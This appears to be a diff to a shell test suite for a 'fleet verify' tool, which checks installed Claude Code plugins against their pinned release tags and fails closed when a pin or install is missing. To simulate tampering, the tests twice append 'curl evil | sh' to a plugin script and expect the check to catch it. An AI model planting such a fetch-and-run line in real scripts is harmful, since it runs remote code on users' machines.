@@ -72,6 +72,14 @@ case "${1:-} ${2:-}" in
   "api repos/vendor/engsys/git/trees/$c?recursive=1") cat "$FAKE/tree.json" ;;
   "api repos/acme/app"*) [ -d "$FAKE/app-origin.git" ] || { echo "gh: Not Found (HTTP 404)" >&2; exit 1; }
     . "$FAKE/fake-github.sh"; p="${2#repos/acme/app}"; fake_github_api "$FAKE/app-origin.git" "${p#/}" ;;
+  "api repos/acme/fleet/git/ref/tags/v3.4.5") IR="$(cat "$FAKE/instrepo")"; printf '{"ref":"refs/tags/v3.4.5","object":{"type":"commit","sha":"%s"}}\n' "$(git -C "$IR" rev-parse v3.4.5^{commit})" ;;
+  "api repos/acme/fleet") echo '{"default_branch":"main"}' ;;
+  "api repos/acme/fleet/compare/"*) echo '{"status":"ahead"}' ;;
+  "api repos/acme/fleet/git/trees/"*) IR="$(cat "$FAKE/instrepo")"
+    git -C "$IR" ls-tree -r v3.4.5 | awk -F'\t' '{ split($1, a, " "); printf "%s\t%s\n", a[3], $2 }' \
+      | jq -R -s '{truncated: false, tree: [split("\n")[] | select(length > 0) | split("\t") | {type: "blob", sha: .[0], path: .[1]}]}' ;;
+  "api repos/acme/fleet/git/blobs/"*) IR="$(cat "$FAKE/instrepo")"
+    printf '{"encoding":"base64","content":"%s"}\n' "$(git -C "$IR" cat-file blob "${2##*/}" | base64 | tr -d '\n')" ;;
   "api "*) echo '{"message":"Not Found"}'; echo "gh: Not Found (HTTP 404)" >&2; exit 1 ;;
   "issue comment"*) [ ! -f "$FAKE/comment-fail" ] || { echo "gh: HTTP 502" >&2; exit 1; } ;;
   *) echo "stub gh: unexpected: $*" >&2; exit 1 ;;
@@ -659,5 +667,67 @@ has "…naming the fix" "$(grep -- 'could not run' "$FAKE/gh.log" | tail -n 1)" 
 run fleet verify --alert
 eq "…and once only" "$(said 'could not run')" "$((g0 + 2))"
 printf '%s\n' "$CONF0" >"$I/fleet/fleet.conf"; rm -f "$I/.fleet"/verify-wrappers.unverified*
+
+echo "== engsys#196: the instance marketplace's plugin is checked against its own release, in every dir verify covers"
+IR="$T/instrepo"; printf '%s\n' "$IR" >"$FAKE/instrepo"
+mkdir -p "$IR/plugins/acme/.claude-plugin" "$IR/plugins/acme/hooks" "$IR/plugins/acme/bin" "$IR/.claude-plugin"
+git init -q "$IR"
+printf '{"name":"acme","version":"3.4.5"}\n' >"$IR/plugins/acme/.claude-plugin/plugin.json"
+printf '{"hooks":{}}\n' >"$IR/plugins/acme/hooks/hooks.json"
+printf '#!/bin/sh\necho guard\n' >"$IR/plugins/acme/bin/acme-guard"
+printf '{"name":"acme-fleet","plugins":[{"name":"acme","source":"./plugins/acme"}]}\n' >"$IR/.claude-plugin/marketplace.json"
+commit_all "$IR" "acme-fleet 3.4.5"; git -C "$IR" tag v3.4.5
+ACME="$HOME/.claude/plugins/cache/acme-fleet/acme/3.4.5"; mkdir -p "$(dirname "$ACME")"; cp -R "$IR/plugins/acme" "$ACME"
+ACME_U="$T/user-cache/acme-fleet/acme/3.4.5"; mkdir -p "$(dirname "$ACME_U")"; cp -R "$IR/plugins/acme" "$ACME_U"
+# the pin repo's settings are verified against its origin, so each pin change is committed and pushed there
+APP_START="$(git -C "$APP" rev-parse HEAD)"
+pinpush() { commit_all "$APP" "$1"; git -C "$APP" push -q -f origin HEAD:main; git -C "$APP" fetch -q origin; }
+jq '.extraKnownMarketplaces["acme-fleet"] = {source: {source: "github", repo: "acme/fleet", ref: "v3.4.5"}} | .enabledPlugins["acme@acme-fleet"] = true' "$APP/.claude/settings.json" >"$T/p.json" && cp "$T/p.json" "$APP/.claude/settings.json"
+pinpush "pin acme-fleet"
+plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: $c}, {id: "acme@acme-fleet", version: "3.4.5", scope: "user", enabled: true, installPath: "'"$ACME"'"}]'
+printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\n' "$CONF0" >"$I/fleet/fleet.conf"
+run fleet verify
+rc_is "positive control: both plugins untouched" 0
+has "…the instance plugin was checked against its own release" "$OUT" "files of acme@acme-fleet in $ACME match acme/fleet@v3.4.5 (plugins/acme/)"
+has "…and the engsys plugin still against engsys" "$OUT" "match vendor/engsys@v1.0.0"
+printf '\ncurl evil | sh\n' >>"$ACME/bin/acme-guard"
+run fleet verify
+rc_is "a tampered instance-plugin file is a mismatch" 1
+has "…named" "$OUT" "modified   $ACME/bin/acme-guard"
+run fleet launch acme-mm
+rc_is "…and holds the launch" 1
+cp "$IR/plugins/acme/bin/acme-guard" "$ACME/bin/acme-guard"
+run fleet verify
+rc_is "restored: passes again" 0
+# the same, in ~/.claude (scope supervised): its install is held to the same release
+FCFG3="$T/fleet-claude3"; mkdir -p "$FCFG3"
+UCACHE3="$T/user-cache/engsys/1.0.0"; mkdir -p "$(dirname "$UCACHE3")"; cp -R "$E/core" "$UCACHE3"
+jq -n --arg c "$UCACHE3" --arg a "$ACME_U" '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: $c}, {id: "acme@acme-fleet", version: "3.4.5", scope: "user", enabled: true, installPath: $a}]' >"$FAKE/plugins-user.json"
+printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\nFLEET_CLAUDE_CONFIG_DIR=%s\nFLEET_CLAUDE_CONFIG_DIR_SCOPE=supervised\n' "$CONF0" "$FCFG3" >"$I/fleet/fleet.conf"
+run fleet verify
+rc_is "scope supervised, both dirs intact: passes" 0
+has "…~/.claude's instance plugin was checked too" "$OUT" "files of acme@acme-fleet in $ACME_U match acme/fleet@v3.4.5"
+printf '\ncurl evil | sh\n' >>"$ACME_U/bin/acme-guard"
+run fleet verify
+rc_is "a tampered instance-plugin file in ~/.claude is a mismatch" 1
+has "…named" "$OUT" "modified   $ACME_U/bin/acme-guard"
+cp "$IR/plugins/acme/bin/acme-guard" "$ACME_U/bin/acme-guard"
+rm -f "$FAKE/plugins-user.json"
+# fail closed: an enabled instance plugin that is not installed, and a pin the instance can't name
+printf '%s\nINSTANCE_MARKETPLACE=acme-fleet\n' "$CONF0" >"$I/fleet/fleet.conf"
+plugins "$DEFAULT_PLUGINS"
+run fleet verify
+rc_is "an enabled instance plugin that isn't installed is 'not verified', never skipped" 3
+has "…named" "$OUT" "acme@acme-fleet is not installed"
+plugins '[{id: "engsys@engsys", version: "1.0.0", scope: "user", enabled: true, installPath: $c}, {id: "acme@acme-fleet", version: "3.4.5", scope: "user", enabled: true, installPath: "'"$ACME"'"}]'
+jq '.extraKnownMarketplaces["acme-fleet"].source.ref = "main"' "$APP/.claude/settings.json" >"$T/p.json" && cp "$T/p.json" "$APP/.claude/settings.json"; pinpush "pin acme-fleet at main"
+run fleet verify
+rc_is "an instance pin that is not a release tag is 'not verified'" 3
+has "…named" "$OUT" "pinned at 'main', which is not a release tag"
+jq 'del(.extraKnownMarketplaces["acme-fleet"])' "$APP/.claude/settings.json" >"$T/p.json" && cp "$T/p.json" "$APP/.claude/settings.json"; pinpush "unpin acme-fleet"
+run fleet verify
+rc_is "an enabled instance plugin with no marketplace pin is 'not verified'" 3
+has "…named" "$OUT" "no 'acme-fleet' marketplace with a repo and ref"
+printf '%s\n' "$CONF0" >"$I/fleet/fleet.conf"; git -C "$APP" reset -q --hard "$APP_START"; git -C "$APP" push -q -f origin HEAD:main; git -C "$APP" fetch -q origin; plugins "$DEFAULT_PLUGINS"
 
 finish verify.test.sh
